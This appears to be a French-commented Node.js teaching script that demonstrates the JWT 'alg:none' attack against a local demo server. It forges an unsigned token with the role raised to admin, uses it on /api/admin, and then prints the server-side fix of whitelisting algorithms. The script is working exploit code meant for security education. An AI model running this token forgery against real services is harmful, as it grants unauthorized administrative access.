const BASE_URL = 'http://localhost:3000';

function b64Encode(obj) {
  return Buffer.from(JSON.stringify(obj)).toString('base64url');
}

function b64Decode(str) {
  return JSON.parse(Buffer.from(str, 'base64url').toString('utf8'));
}

function banner(title) {
  console.log('\n' + '─'.repeat(60));
  console.log(' ' + title);
  console.log('─'.repeat(60));
}

async function run() {
  banner('ATTAQUE 1 : alg:none — forge de token sans signature');

  console.log('\n[1] Connexion avec alice (role: user)...');
  const loginRes = await fetch(`${BASE_URL}/auth/login`, {
    method:  'POST',
    headers: { 'Content-Type': 'application/json' },
    body:    JSON.stringify({ username: 'alice', password: 'password123' }),
  });
  const { token: legitimateToken } = await loginRes.json();
  console.log('    Token légitime :', legitimateToken);

  const [headerB64, payloadB64] = legitimateToken.split('.');
  const originalHeader  = b64Decode(headerB64);
  const originalPayload = b64Decode(payloadB64);

  console.log('\n[2] Décodage du token :');
  console.log('    Header  :', JSON.stringify(originalHeader));
  console.log('    Payload :', JSON.stringify(originalPayload));

  console.log('\n[3] Forge du token malveillant...');
  const forgedHeader  = b64Encode({ alg: 'none', typ: 'JWT' });
  const forgedPayload = b64Encode({ ...originalPayload, role: 'admin' });
  const forgedToken   = `${forgedHeader}.${forgedPayload}.`;

  console.log('    Header forgé  :', JSON.stringify({ alg: 'none', typ: 'JWT' }));
  console.log('    Payload forgé :', JSON.stringify({ ...originalPayload, role: 'admin' }));
  console.log('    Token forgé   :', forgedToken);

  console.log('\n[4] Accès à /api/admin avec le token alg:none...');
  const adminRes  = await fetch(`${BASE_URL}/api/admin`, {
    headers: { Authorization: `Bearer ${forgedToken}` },
  });
  const adminData = await adminRes.json();

  if (adminRes.ok) {
    console.log('\n✅ ATTAQUE RÉUSSIE — accès admin obtenu sans connaître le secret !');
    console.log('   Réponse :', JSON.stringify(adminData, null, 2));
  } else {
    console.log('\n❌ Attaque échouée (serveur probablement durci).');
    console.log('   Réponse :', JSON.stringify(adminData));
  }

  console.log('\n[5] Contrôle : /api/admin avec le token légitime d\'alice (role:user)...');
  const checkRes  = await fetch(`${BASE_URL}/api/admin`, {
    headers: { Authorization: `Bearer ${legitimateToken}` },
  });
  const checkData = await checkRes.json();
  console.log('    HTTP', checkRes.status, '—', checkData.error || checkData.message);

  banner('FIN DE L\'ATTAQUE 1');
  console.log('\nCorrection : utiliser une whitelist d\'algorithmes côté serveur.');
  console.log('Exemple Node.js :  jwt.verify(token, secret, { algorithms: ["HS256"] })\n');
}

run().catch(err => {
  console.error('\n[ERREUR] Impossible de contacter le serveur :', err.message);
  console.error('→ Assurez-vous que le serveur est lancé : node server.js\n');
  process.exit(1);
});
